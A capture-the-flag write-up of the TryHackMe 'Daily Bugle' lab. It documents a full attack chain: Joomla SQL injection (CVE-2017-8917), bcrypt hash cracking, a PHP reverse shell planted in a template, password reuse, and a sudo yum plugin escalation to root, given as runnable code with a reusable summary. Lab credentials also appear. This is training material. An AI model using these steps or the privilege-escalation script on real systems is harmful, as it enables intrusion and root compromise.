# Daily Bugle - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80, 3306) -> Web Reconnaissance (Joomla CMS 3.7.0 Discovery) -> Unauthenticated SQL Injection (CVE-2017-8917 / `com_fields`) -> Extraction of Administrative bcrypt Hash -> Offline Cracking with Hashcat (`spiderman123`) -> Joomla Administrative Dashboard Access -> Template Modification (`error.php`) -> Reverse Shell as `apache` -> CMS Configuration Inspection (`configuration.php`) -> Password Reuse Lateral Movement to `jjameson` -> Sudo Privilege Audit (`NOPASSWD: /usr/bin/yum`) -> GTFOBins Yum Plugin Execution -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Daily Bugle |
| **Platform** | TryHackMe |
| **OS** | Linux (CentOS 7) |
| **Difficulty** | Hard |
| **Status** | Rooted |
| **Key Techniques** | Joomla Enumeration, SQL Injection (CVE-2017-8917), bcrypt Hash Cracking, CMS Template RCE, Password Reuse, Sudo Yum GTFOBins PrivEsc |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.130.40 10.10.130.40
```

**Open Ports:**

| Port | Service | Version | Description |
| :--- | :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 7.4 | Remote administration service |
| 80/tcp | HTTP | Apache httpd 2.4.6 (CentOS) + PHP 5.6.40 | Primary web application |
| 3306/tcp | MySQL | MariaDB (unauthorized) | Database service |

### 1.2 Web Enumeration and CMS Fingerprinting

Navigating to `http://10.10.130.40/` displays a news publication blog named "The Daily Bugle".

Inspecting `robots.txt` exposed standard administrative endpoints:
- Disallows access to `/administrator/` (Joomla admin panel).

#### Version Identification Pitfall
A common pitfall on this target is inspecting `/administrator/manifests/files/joomla.xml`, which reports version `3.6`. However, scanning with specific file extensions using Gobuster revealed the actual documentation file:

```bash
gobuster dir -u http://10.10.130.40/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old
```

Reading `README.txt`:

```bash
curl -s http://10.10.130.40/README.txt | head -n 5
```

The file confirms the exact deployed version: **Joomla! 3.7.0**.

---

## 2. Initial Access

### 2.1 Vulnerability Discovery: Joomla SQL Injection (CVE-2017-8917)

Searching Exploit-DB for Joomla 3.7.0:

```bash
searchsploit joomla 3.7.0
```

```text
Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
```

> [!NOTE] Concept: CVE-2017-8917 (Joomla com_fields SQL Injection)
> In Joomla 3.7.0, the `com_fields` component introduced an unauthenticated SQL injection vulnerability in the `view=fields` parameter. Attackers can leverage error-based or union-based SQL injection to extract data from the database, including credentials stored in the `#__users` table.

### 2.2 Exploitation and bcrypt Hash Cracking

Execute an automated Python exploit script targeting the `com_fields` parameter to extract the administrative record:

```bash
python3 joomla_sqli.py http://10.10.130.40/
```

```text
[+] Extracting admin user...
Found:
Username: jonah
Email: jonah@tryhackme.com
Password hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

The hash begins with `$2y$`, indicating the bcrypt hashing algorithm.

Save the hash to `hash.txt` and crack it using Hashcat (mode 3200):

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
```

Plaintext password: **`spiderman123`**.

### 2.3 Joomla Template Remote Code Execution

1. Navigate to `http://10.10.130.40/administrator/` and authenticate using:
   - **Username:** `jonah`
   - **Password:** `spiderman123`
2. Open **Extensions -> Templates -> Templates**.
3. Select the active site template (e.g., Protostar Details and Files).
4. Select `error.php` in the template editor and replace its contents with a PHP reverse shell payload.
5. Start a Netcat listener:

```bash
nc -lvnp 4444
```

6. Trigger the shell by requesting a non-existent page to invoke `error.php`:

```bash
curl http://10.10.130.40/nonexistent_route
```

The reverse shell connects back under the context of the Apache service account:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.130.40] 48192
bash-4.2$ whoami
apache
```

---

## 3. Privilege Escalation

### 3.1 Lateral Movement: Password Reuse

Inspect the Joomla configuration file `/var/www/html/configuration.php`:

```bash
cat /var/www/html/configuration.php | grep -i password
```

```php
public $password = 'nv5uz9r3ZEDzVjNu';
```

Checking `/home` reveals a local user named `jjameson`.

Test the discovered database password against `jjameson`:

```bash
su jjameson
```

Supply password `nv5uz9r3ZEDzVjNu` when prompted. The password succeeds. Alternatively, authenticate via SSH:

```bash
ssh jjameson@10.10.130.40
```

Retrieve the user flag:

```bash
cat /home/jjameson/user.txt
```

```text
[FLAG REDACTED]
```

### 3.2 Privilege Escalation: Sudo Yum GTFOBins Plugin

Checking sudo permissions for `jjameson`:

```bash
sudo -l
```

```text
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, env_reset,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

The user is permitted to execute `/usr/bin/yum` as `root` without a password.

> [!NOTE] Concept: GTFOBins Sudo Yum Plugin Execution
> The `yum` package manager on RedHat/CentOS distributions supports custom plugins. By creating a temporary configuration directory containing a malicious Python plugin that executes `/bin/sh` during initialization, invoking `yum` with `--enableplugin` spawns a root shell.

Execute the GTFOBins plugin exploit:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

The initialization hook executes with root privileges:

```bash
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Gobuster Extension Scanning
gobuster dir -u http://<TARGET_IP>/ -w <WORDLIST> -x php,txt,html,bak,old

# Crack bcrypt Hashes with Hashcat
hashcat -m 3200 -a 0 hash.txt rockyou.txt

# Inspect CMS Configuration Credentials
grep -E "password|pass|secret" /var/www/html/*.php

# Sudo Yum GTFOBins Root Shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os, yum
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```

---

## 5. Key Takeaways and Lessons Learned

1. **Verify CMS Versions from Multiple Sources:** Manifest files like `joomla.xml` can contain outdated release tags. Cross-referencing version strings against `README.txt`, `CHANGELOG.txt`, or component headers ensures exploits match the active deployment.
2. **Configuration File Auditing:** Immediately upon obtaining a web service shell, prioritize reading database and application configuration files (`configuration.php`, `wp-config.php`). Database credentials frequently unlock system user accounts through password reuse.
3. **Yum Privilege Escalation:** Sudo rights on `yum` or `dnf` can be escalated without modifying system packages by registering arbitrary Python plugin hooks that trigger before package operations begin.

---

#tryhackme #linux #hard #joomla #sqli #cve-2017-8917 #bcrypt #hashcat #password-reuse #sudo #yum #gtfobins #privesc